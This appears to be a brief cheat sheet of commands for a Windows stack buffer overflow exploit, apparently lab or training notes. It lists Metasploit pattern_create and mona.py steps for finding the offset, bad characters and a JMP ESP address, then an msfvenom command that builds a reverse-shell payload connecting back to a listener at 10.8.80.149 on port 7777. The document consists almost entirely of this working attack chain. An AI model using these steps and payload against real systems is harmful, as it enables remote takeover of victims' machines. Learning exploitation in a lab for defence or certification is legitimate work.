# BufferOverflow


/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

!mona findmsp -distance 600

!mona bytearray -b "\x00"

!mona compare -f bytearray.bin -a <ESP address>

!mona jmp -r esp -cpb "\x00"



shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.149 LPORT=7777 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c